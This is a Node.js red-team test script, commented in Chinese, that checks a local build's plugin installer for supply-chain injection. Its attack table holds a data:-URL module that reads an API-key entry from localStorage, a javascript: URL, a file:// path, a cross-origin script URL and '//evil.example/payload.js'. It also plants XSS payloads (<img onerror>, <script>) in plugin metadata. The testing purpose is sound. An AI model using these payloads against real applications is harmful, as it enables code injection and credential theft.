/* 客户端红队：插件供应链攻击面
 *
 * 攻击假设：攻击者能让用户点一个「安装」链接（或塞一条索引），
 * 插件系统会把它当脚本执行 —— 这等于页面内任意代码执行（可偷 localStorage 里的 API Key）。
 *
 * 用法：node tests/redteam-client.mjs  （打本地构建）
 */
import { spawn } from 'node:child_process';
import { createServer } from 'node:net';

const ROOT = process.argv[2];
const EDGE = 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe';
const freePort = () => new Promise((r) => { const s = createServer(); s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });

const httpPort = await freePort();
const cdpPort = await freePort();
const srv = spawn('python', ['-m', 'http.server', String(httpPort), '--bind', '127.0.0.1'], { cwd: ROOT, stdio: 'ignore', windowsHide: true });
await new Promise((r) => setTimeout(r, 1200));
const edge = spawn(EDGE, ['--headless=new', '--disable-gpu', `--remote-debugging-port=${cdpPort}`,
  `--user-data-dir=${process.env.TEMP}\\edge-redteam-client`, `http://127.0.0.1:${httpPort}/index.html`], { stdio: 'ignore', windowsHide: true });

async function target() {
  for (let i = 0; i < 80; i++) {
    try {
      const list = await (await fetch(`http://127.0.0.1:${cdpPort}/json/list`)).json();
      const p = list.find((t) => t.type === 'page' && t.webSocketDebuggerUrl);
      if (p) return p;
    } catch (e) {}
    await new Promise((r) => setTimeout(r, 300));
  }
  throw new Error('CDP 没起来');
}

const page = await target();
const ws = new WebSocket(page.webSocketDebuggerUrl);
await new Promise((res, rej) => { ws.onopen = res; ws.onerror = rej; });
let id = 0; const pending = new Map(); const errors = [];
ws.onmessage = (e) => {
  const m = JSON.parse(e.data);
  if (m.id && pending.has(m.id)) { pending.get(m.id)(m.result); pending.delete(m.id); }
  else if (m.method === 'Runtime.exceptionThrown') errors.push(String(m.params.exceptionDetails.exception?.description || '').slice(0, 120));
};
const send = (method, params) => new Promise((res) => { const i = ++id; pending.set(i, res); ws.send(JSON.stringify({ id: i, method, params })); });
const ev = async (expr) => {
  const r = await send('Runtime.evaluate', { expression: expr, returnByValue: true, awaitPromise: true });
  if (r && r.exceptionDetails) return 'EXC:' + String(r.exceptionDetails.exception?.description || '').slice(0, 160);
  return r && r.result ? r.result.value : undefined;
};
await send('Runtime.enable');

for (let i = 0; i < 40; i++) {
  await new Promise((r) => setTimeout(r, 400));
  if ((await ev('typeof (window.XN && XN.plugin && XN.plugin.installAuto)')) === 'function') break;
}

const ATTACKS = {
  /* 1) data: 协议 —— 不落地文件，直接注入模块 */
  dataUrl: `data:text/javascript,${encodeURIComponent('export function apply(ctx){window.__PWNED_DATA__=1;try{window.__STOLEN__=localStorage.getItem("xn.v2.cfg")||""}catch(e){}}')}`,
  /* 2) javascript: 伪协议 */
  jsUrl: 'javascript:window.__PWNED_JS__=1',
  /* 3) file: 协议 */
  fileUrl: 'file:///C:/Windows/win.ini',
  /* 4) 跨源地址（真实域名，模拟第三方 CDN 被投毒） */
  crossOrigin: 'https://raw.githubusercontent.com/conor13/dsh-hippocampus/main/index.js',
  /* 5) 协议相对地址 */
  protoRelative: '//evil.example/payload.js'
};

const out = {};
for (const [name, url] of Object.entries(ATTACKS)) {
  const r = await ev(`XN.plugin.installAuto(${JSON.stringify(url)}).then(function(r){return JSON.stringify(r)}).catch(function(e){return 'REJECT:'+e.message})`);
  await new Promise((res) => setTimeout(res, 500));
  out[name] = {
    结果: String(r).slice(0, 90),
    是否执行了代码: await ev('!!(window.__PWNED_DATA__||window.__PWNED_JS__)'),
    拿到localStorage: await ev('!!window.__STOLEN__')
  };
}

/* 运行时插件配置里写 HTML 会不会被当标签渲染 */
await ev(`(function(){ XN.plugin.register({id:'xssprobe',name:'<img src=x onerror=window.__PWNED_XSS__=1>',version:'0.0.1',description:'<script>window.__PWNED_XSS2__=1<\\/script>',view:{id:'xssprobe',title:'x',onShow(){}}}); })()`);
await ev(`XN.switchView('plugins')`);
await new Promise((r) => setTimeout(r, 800));
out.插件名XSS = {
  渲染成标签了: await ev(`!!document.querySelector('#pluginCard img') || !!window.__PWNED_XSS__ || !!window.__PWNED_XSS2__`),
  显示为文本: await ev(`((document.querySelector('#pluginCard')||{}).innerText||'').includes('<img')`)
};

console.log('\n=== 客户端红队：插件供应链 ===');
console.log(JSON.stringify(out, null, 2));
if (errors.length) console.log('页面异常：', errors.slice(0, 4));

const vuln = Object.entries(out).filter(([, v]) => v.是否执行了代码 || v.拿到localStorage || v.渲染成标签了).map(([k]) => k);
console.log(vuln.length ? `\n可利用面：${vuln.join(', ')}` : '\n未发现可用注入路径');

ws.close(); edge.kill(); srv.kill();
process.exit(vuln.length ? 1 : 0);
